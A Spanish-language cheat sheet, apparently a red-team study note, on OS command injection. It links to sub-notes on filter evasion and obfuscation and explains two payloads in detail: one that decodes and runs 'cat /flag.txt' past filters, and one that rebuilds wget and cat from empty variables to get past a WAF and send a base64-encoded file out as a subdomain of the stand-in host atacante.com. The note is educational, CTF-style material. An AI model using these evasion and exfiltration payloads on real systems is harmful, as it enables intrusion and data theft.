---
aliases:
tags:
  - type/vulnerability
  - vuln/command-injection
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Explotación Web]]"
type: CheatSheet
linked:
  - "[[Command Injection - Operadores Generales]]"
  - "[[Command Injection - Bypass de Espacios]]"
  - "[[Command Injection - Generación de Caracteres Bloqueados]]"
  - "[[Command Injection - Operadores Especificos]]"
  - "[[Command Injection - Lista Negra de Comandos]]"
  - "[[Command Injection - Obfuscacion Avanzada (Case, Reverse, Encoding)]]"
  - "[[Command Injection - Herramientas de Obfuscación Automática]]"
  - "[[Command Injection - Prevención]]"
---
# OS Command Injection

***

## Cheatsheet

### Operadores

````tabs
tab: **Operadores Generales**
![[Command Injection - Operadores Generales#^ci-operadores-generales]]

tab: **Operadores Especificos**
![[Command Injection - Operadores Especificos#^ci-operadores-especificos]]
````

___

### Evasión de Filtros

````tabs
tab: **Espacios**
![[Command Injection - Bypass de Espacios#^ci-bypass-espacios]]

tab: **Caracteres Bloqueados**
![[Command Injection - Generación de Caracteres Bloqueados#^ci-caracteres-bloqueados]]

tab: **Lista Negra de Comandos**
![[Command Injection - Lista Negra de Comandos#^ci-blacklist-comandos]]
````

___

### Obfuscación

````tabs
tab: **Mayusculas**
![[Command Injection - Obfuscacion Avanzada (Case, Reverse, Encoding)#^ci-avanzado-mayusculas]]

tab: **Comandos Invertidos**
![[Command Injection - Obfuscacion Avanzada (Case, Reverse, Encoding)#^ci-avanzado-comandos-invertidos]]

tab: **Comandos Codificados**
![[Command Injection - Obfuscacion Avanzada (Case, Reverse, Encoding)#^ci-avanzado-comandos-codificados]]

````

***

## Ejemplos 

#### Payload 1: 

```bash
$IFS%26b"a"sh<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)
```

- **`$IFS%26`**: Internal Field Separator seguido de la codificación URL del símbolo ampersand (`&`). 
- **`b"a"sh`**: Técnica de evasión con comillas para que el servidor no detecte la palabra clave `bash`. Bash lo leerá como `bash`.
- **`<<<`**: Esto se llama _Here-string_ en Bash. Su función es tomar lo que está a su derecha y pasárselo como entrada estándar (stdin) al comando que está a su izquierda (en este caso, a `bash`).
- **`$(...)`**: Se llama _Sustitución de comandos_. Bash ejecuta primero lo que hay dentro de los paréntesis y reemplaza toda la expresión con el resultado de esa ejecución.
- **`base64%09-d`**:
    - `base64`: El programa para decodificar texto.
    - `%09`: Es la codificación URL de una **tabulación** (`\t`). Se usa aquí como un sustituto del espacio porque a menudo los filtros bloquean los espacios pero olvidan bloquear las tabulaciones.
    - `-d`: El argumento para "decodificar" (decode).
- **`<<<Y2F0IC9mbGFnLnR4dA==`**: Otra _here-string_ que le pasa esa cadena en Base64 al comando `base64 -d`. Si se decodifica`Y2F0IC9mbGFnLnR4dA==`, el resultado exacto es `cat /flag.txt`.

**Resumen decodificado:**
El flujo de ejecución ocurre de adentro hacia afuera:
1. Decodifica el texto en Base64: `base64 -d <<< Y2F0...` se convierte en el texto `cat /flag.txt`.
2. Ese texto decodificado se pasa a Bash: `bash <<< "cat /flag.txt"`.
3. Bash recibe el string y lo ejecuta, revelando el contenido de la flag.

---

#### Payload 2:

```bash
;$(/b$ui$un/w$ug$ue$ut$IFS-qO-$IFS'http://'$(c$ua$ut$IFS${PATH:0:1}f$ul$ua$ug.t$ux$ut|b$ua$us$ue64|t$ur$IFS-d$IFS'\n')'.atacante.com')
```

###### El Escenario del Filtro

Suponiendo que el Firewall de Aplicaciones Web (WAF) bloquea absolutamente todo esto:
- Espacios ( )
- Barras diagonales (`/`)
- Cualquier palabra clave sospechosa: `cat`, `wget`, `bin`, `flag`, `base64`, `tr`.

###### Desglose paso a paso (Cómo el atacante engaña a Bash)

El secreto de este payload radica en el uso de **variables no inicializadas** y la forma en que el motor de Bash (el intérprete de comandos) procesa el texto antes de ejecutarlo.

**1. El truco de la variable vacía (`$u`)**
En Bash, si llamas a una variable que no existe (por ejemplo `$u`), Bash simplemente la ignora y la reemplaza por "nada" (un string vacío). El atacante intercala `$u` en medio de palabras prohibidas para romper la firma visual que busca el WAF.

- El WAF lee: `w$ug$ue$ut` (no lo reconoce, lo deja pasar).
- Bash interpreta: `w` + `nada` + `g` + `nada` + `e` + `nada` + `t` = **`wget`**.
- Con esto, el atacante reconstruye binarios enteros: `/b$ui$un/w$ug$ue$ut` se convierte en `/bin/wget`. `c$ua$ut` se convierte en `cat`.

**2. Sustitución de comandos anidada `$( ... )`**
El payload tiene dos niveles de ejecución `$( ... )`. Bash siempre resuelve esto de adentro hacia afuera, como las muñecas rusas (Matrioshkas).

**Nivel Interno (Leyendo y preparando el dato):**
```Bash
$(c$ua$ut$IFS${PATH:0:1}f$ul$ua$ug.t$ux$ut|b$ua$us$ue64|t$ur$IFS-d$IFS'\n')
```
- `c$ua$ut$IFS`: Se convierte en `cat` (usando `$IFS` como espacio).
- `${PATH:0:1}`: Como vimos antes, extrae el primer carácter de `$PATH`, que es `/`.
- `f$ul$ua$ug.t$ux$ut`: Se convierte en `flag.txt`.
- `| b$ua$us$ue64`: Pasa el archivo leído al comando `base64` para codificarlo (esquivando caracteres extraños que romperían la URL).
- `| t$ur$IFS-d$IFS'\n'`: Esto es brillante. El comando `tr -d '\n'` se usa para eliminar los saltos de línea que genera `base64`. Si no se eliminan, la URL que se va a construir después se rompería.

_Resultado del nivel interno:_ Un string continuo en base64, por ejemplo: `ZmxhZ3tTM3VyM19IYWNrM3J9` (que decodificado sería `flag{S3ur3_Hack3r}`).

**Nivel Externo (La Exfiltración):**
Una vez que Bash resuelve el nivel interno, ensambla el comando final:
```Bash
$(/bin/wget -qO- http://ZmxhZ3tTM3VyM19IYWNrM3J9.atacante.com)
```

- `/bin/wget`: Una herramienta de Linux para hacer peticiones web.
- `-qO-`: Parámetros para que `wget` sea silencioso (quiet) y envíe la salida a la nada, evitando dejar rastros en los logs locales de la terminal.
- `http://[FLAG_EN_BASE64].atacante.com`: El servidor contacta a una dirección web propiedad del atacante, usando el contenido secreto como un **subdominio**.

###### El Resultado Final

El atacante está sentado en su casa mirando los registros (logs) de su servidor DNS o web (`atacante.com`). De repente, ve una petición buscando la IP de:
`ZmxhZ3tTM3VyM19IYWNrM3J9.atacante.com`
El atacante solo tiene que tomar ese subdominio, pasarlo por un decodificador Base64 y habrá robado el archivo `/flag.txt` sin que la aplicación haya mostrado un solo error en pantalla, y esquivando un WAF altamente restrictivo.


---
